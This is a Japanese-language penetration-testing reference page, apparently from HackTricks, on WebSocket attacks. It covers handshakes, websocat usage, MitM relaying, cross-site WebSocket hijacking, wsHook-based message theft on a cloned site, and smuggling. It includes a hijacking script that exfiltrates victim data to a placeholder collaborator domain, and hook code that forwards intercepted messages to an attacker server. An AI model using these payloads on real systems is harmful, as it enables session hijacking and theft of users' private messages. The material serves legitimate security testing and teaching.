# WebSocket 攻撃

<details>

<summary><strong>AWS ハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの会社を広告掲載したい場合**や**HackTricks を PDF でダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f)や [**telegram グループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を**フォローする**
* **HackTricks** の GitHub リポジトリ [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) に PR を提出して、あなたのハッキングテクニックを共有する。

</details>

## WebSockets とは何か

WebSocket 接続は **HTTP** 上で開始され、通常は**長時間存続**します。メッセージは**いつでもどちらの方向にも送信**でき、トランザクション性はありません。接続は通常、クライアントまたはサーバーがメッセージを送信する準備ができるまで開いたままで、アイドル状態を維持します。\
WebSocket は、金融データのリアルタイムフィードなど、**低遅延やサーバーからのメッセージが必要な状況**で特に有用です。

### WebSocket 接続はどのように確立されるか？

(ここには要約がありますが、**web socket 接続がどのように作成されるか**についての**より詳細なガイド**は[**こちら**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc)で見つけることができます)。\
WebSocket 接続は通常、以下のようなクライアントサイドの JavaScript を使用して作成されます：
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
**`wss`** プロトコルは暗号化された **TLS** 接続上でWebSocketを確立しますが、**`ws`** プロトコルは**暗号化されていない**接続を使用します。

接続を確立するために、ブラウザとサーバーはHTTP上でWebSocketハンドシェイクを実行します。ブラウザは以下のようなWebSocketハンドシェイクリクエストを発行します：
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
サーバーが接続を受け入れると、次のようなWebSocketハンドシェイク応答を返します:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
この時点で、ネットワーク接続は開いたままであり、WebSocketメッセージをどちらの方向にも送信するために使用できます。

**注意**

WebSocket **ハンドシェイク**メッセージのいくつかの**特徴**に注目する価値があります：

* リクエストとレスポンスの**`Connection`** と **`Upgrade`** ヘッダーは、これが**WebSocketハンドシェイク**であることを**示しています**。
* **`Sec-WebSocket-Version`** リクエストヘッダーは、クライアントが使用したい**WebSocketプロトコルのバージョン**を指定します。通常は `13` です。
* **`Sec-WebSocket-Key`** リクエストヘッダーには、Base64エンコードされた**ランダムな値**が含まれており、各ハンドシェイクリクエストでランダムに生成されるべきです。
* **`Sec-WebSocket-Accept`** レスポンスヘッダーには、`Sec-WebSocket-Key` リクエストヘッダーに提出された値と、プロトコル仕様で定義された特定の文字列を連結したハッシュが含まれています。これは、誤設定されたサーバーやキャッシュプロキシからの誤解を招くレスポンスを防ぐために行われます。

**`Sec-WebSocket-Key`** ヘッダーにはキャッシュプロキシのエラーを防ぐための**ランダムな値**が含まれており、認証やセッション処理の目的で**使用されません**（_CSRFトークンではありません_）。

### Linuxコンソール

`websocat` を使用して、websocketとの生の接続を確立できます。
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
またはwebsocatサーバーを作成するには：
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket 接続

クライアントが現在のローカルネットワークから **HTTP websocket** に接続していることがわかった場合、クライアントとサーバーの間でMitM攻撃を実行するために [ARP Spoofing Attack](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) を試みることができます。\
クライアントが接続しようとしているときに、次のことができます：
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets 列挙

**ツール** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) を使用して、websocketsの**脆弱性**を自動的に発見、指紋認証、検索することができます。

### Websocket デバッグツール

* **Burp Suite** は、通常のHTTP通信と非常に似た方法で、MitM websockets通信をサポートしています。
* [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite 拡張機能** は、**履歴**の取得、**傍受ルール**の設定、**一致および置換**ルールの使用、**Intruder** および **AutoRepeater** の使用により、BurpでのWebsocket通信をより良く管理することを可能にします。
* [**WSSiP**](https://github.com/nccgroup/wssip)： "**WebSocket/Socket.io Proxy**" の略で、このNode.jsで書かれたツールは、クライアントとサーバー間のすべてのWebSocketおよびSocket.IO通信をキャプチャ、傍受、カスタムメッセージの送信、表示するためのユーザーインターフェースを提供します。
* [**wsrepl**](https://github.com/doyensec/wsrepl) は、**ペネトレーションテスト**専用に設計された**インタラクティブなwebsocket REPL**です。**受信するwebsocketメッセージの観察と新しいメッセージの送信**に対するインターフェースを提供し、この通信を**自動化**するための使いやすいフレームワークを備えています。
* [**https://websocketking.com/**](https://websocketking.com/) は、**websockets**を使用して他のウェブと通信するための**ウェブ**です。
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) は、他の通信/プロトコルのタイプの中で、**websockets**を使用して他のウェブと通信するための**ウェブ**を提供しています。

## Websocket ラボ

[**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) には、websocketsを使用してウェブを起動するコードがあり、[**この投稿**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/)では説明が見つかります。

## クロスサイトWebSocketハイジャック (CSWSH)

_cross-origin WebSocket hijacking_ としても知られています。\
**これは** [**Cross-Site Request Forgery (CSRF)**](csrf-cross-site-request-forgery.md) **のWebSocketハンドシェイクにおけるものです。**

これは、**WebSocketハンドシェイク**リクエストがセッション処理に**HTTPクッキー**のみに依存し、CSRFトークンやその他の予測不可能な値を**含まない**場合に発生します。\
攻撃者は、脆弱なアプリケーションに対してクロスサイトWebSocket接続を確立する自分のドメイン上の**悪意のあるウェブページ**を作成することができます。アプリケーションは、アプリケーションとの被害者ユーザーのセッションの**コンテキスト**で接続を処理します。

### シンプルな攻撃

**websocket**接続を**確立**する際に、**クッキー**がサーバーに**送信**されることに注意してください。サーバーは、送信されたクッキーに基づいて各**特定のユーザー**をその**websocketセッション**と**関連付ける**かもしれません。

例えば、**websocketサーバー**が "**READY"** というメッセージが送信された場合にユーザーの会話の履歴を**送り返す**場合、接続を確立する**シンプルなXSS**（クッキーは自動的に被害者ユーザーを認証するために**送信**されます）が "**READY**" を**送信**することで、会話の履歴を**取得**することができます。
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### クロスオリジン + 異なるサブドメインのクッキー

このブログ投稿 [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) では、攻撃者がウェブソケット通信が行われているドメインの**サブドメインで任意のJavascriptを実行**することに成功しました。**サブドメイン**であったため、**クッキー**が**送信**され、**WebsocketがOriginを適切にチェックしていなかった**ため、それと通信し、**トークンを盗む**ことが可能でした。

### ユーザーからデータを盗む

偽装したいウェブアプリケーションをコピーします（例えば.htmlファイル）。ウェブソケット通信が行われているスクリプト内に次のコードを追加します：
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
以下は、`wsHook.js` ファイルをダウンロードし、**ウェブファイルがあるフォルダ内に保存する**方法についての説明です。ウェブアプリケーションを公開し、ユーザーが接続することで、websocket 経由で送受信されるメッセージを盗むことができます。
```javascript
sudo python3 -m http.server 80
```
## レースコンディション

WebSocketsでもレースコンディションは発生します。詳細については[こちらの情報をご覧ください](race-condition.md#rc-in-websockets)。

## その他の脆弱性

Web Socketsは**サーバーサイドとクライアントサイドへデータを送信する**メカニズムであるため、サーバーとクライアントが情報をどのように扱うかによって、**Web Socketsを使用してXSS、SQLi、またはwebsocketのユーザー入力を使用したその他の一般的なWeb脆弱性を悪用することができます。**

## **WebSocket Smuggling**

この脆弱性により、**リバースプロキシの制限をバイパスする**ことができる可能性があります。これは、**websocket通信が確立された**と誤信させることができます（実際には確立されていなくても）。これにより、攻撃者は**隠されたエンドポイントにアクセスする**ことができます。詳細については以下のページをご覧ください：

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## 参考文献

{% embed url="https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWS hackingをゼロからヒーローになる方法を学びましょう</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのhackingのコツを**共有してください**。

</details>
